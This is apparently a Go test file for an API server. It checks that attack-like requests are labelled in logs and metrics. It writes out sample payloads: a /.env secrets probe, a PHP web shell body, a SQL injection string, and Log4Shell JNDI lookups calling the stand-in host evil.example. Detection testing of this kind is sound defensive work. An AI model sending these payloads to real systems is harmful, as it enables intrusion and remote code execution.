package api

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// Requests that look like attacks are labelled in the log and the metrics, with a
// snippet of what was sent only where the request's input may be logged; every error
// answer carries its code. The answers themselves do not change.
func TestAttacksAndErrorsAreLabelled(t *testing.T) {
	server := newTestServer(Config{Version: "t", LogRequests: true})
	defer server.Close()
	var logged bytes.Buffer
	server.logOut = &logged
	send := func(method, path, body string, header ...string) (int, map[string]any) {
		t.Helper()
		logged.Reset()
		var reader io.Reader
		if body != "" {
			reader = strings.NewReader(body)
		}
		req := httptest.NewRequest(method, path, reader)
		req.RemoteAddr = "203.0.113.5:1000"
		req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:158.0) Gecko/20100101 Firefox/158.0")
		for i := 0; i+1 < len(header); i += 2 {
			req.Header.Set(header[i], header[i+1])
		}
		recorder := httptest.NewRecorder()
		server.ServeHTTP(recorder, req)
		var entry map[string]any
		if err := json.Unmarshal(logged.Bytes(), &entry); err != nil {
			t.Fatalf("%s: log line %q: %v", path, logged.String(), err)
		}
		return recorder.Code, entry
	}
	expect := func(entry map[string]any, kind, in, snippet, code string) {
		t.Helper()
		if entry["attack"] != nilIfEmpty(kind) || entry["attack_in"] != nilIfEmpty(in) || entry["error"] != nilIfEmpty(code) {
			t.Errorf("logged attack %v in %v, error %v; want %q in %q, error %q", entry["attack"], entry["attack_in"], entry["error"], kind, in, code)
		}
		got, _ := entry["attack_snippet"].(string)
		if snippet == "" && got != "" || !strings.Contains(got, snippet) {
			t.Errorf("logged snippet %q, want one with %q", got, snippet)
		}
	}

	status, entry := send(http.MethodGet, "/.env", "")
	if status != http.StatusNotFound {
		t.Errorf("/.env answered %d, want the usual 404", status)
	}
	expect(entry, "secrets-file", "path", "/.env", "not_found")

	// A body sent to a path no route took is read for the attack, and quoted.
	_, entry = send(http.MethodPost, "/upload.php", "<?php system($_GET['c']); ?>", "Content-Type", "application/x-www-form-urlencoded")
	expect(entry, "web-shell", "body", "<?php system", "not_found")

	// An injection on a real lookup that failed.
	_, entry = send(http.MethodGet, "/v1/pincode/600001'%20OR%20'1'='1", "")
	expect(entry, "sql-injection", "path", "OR '1'='1", entry["error"].(string))

	// Log4Shell in a header, on a request that worked.
	status, entry = send(http.MethodGet, "/v1/logos/TCS", "", "X-Api-Version", "${jndi:ldap://evil.example/a}")
	if status != http.StatusOK {
		t.Errorf("logo with a Log4Shell header answered %d", status)
	}
	expect(entry, "log4shell", "header", "jndi:ldap", "")

	// A private route: the type is kept, never what was sent.
	_, entry = send(http.MethodGet, "/v1/phone/9876501234", "", "X-Api-Version", "${jndi:ldap://evil.example/9876501234}")
	if entry["attack"] != "log4shell" || entry["attack_snippet"] != nil || strings.Contains(logged.String(), "9876501234") {
		t.Errorf("private route attack logged as %s", logged.String())
	}

	// Not attacks: a company called Shell, and a code image of a script.
	_, entry = send(http.MethodGet, "/v1/logos/SHELL?fallback=none", "")
	expect(entry, "", "", "", entry["error"].(string))
	_, entry = send(http.MethodGet, "/v1", "")
	expect(entry, "", "", "", "")

	// Errors carry their code: a wrong method.
	_, entry = send(http.MethodPut, "/v1/logos/TCS", "")
	expect(entry, "", "", "", "method_not_allowed")

	metrics := server.metrics.render()
	for _, want := range []string{
		`api_attack_requests_total{type="secrets-file",in="path"} 1`,
		`api_attack_requests_total{type="web-shell",in="body"} 1`,
		`api_attack_requests_total{type="log4shell",in="header"} 2`,
		`api_errors_total{route="other",status="404",code="not_found"} 2`,
		`api_errors_total{route="other",status="405",code="method_not_allowed"} 1`,
	} {
		if !strings.Contains(metrics, want) {
			t.Errorf("metrics lack %s", want)
		}
	}
}

func nilIfEmpty(value string) any {
	if value == "" {
		return nil
	}
	return value
}
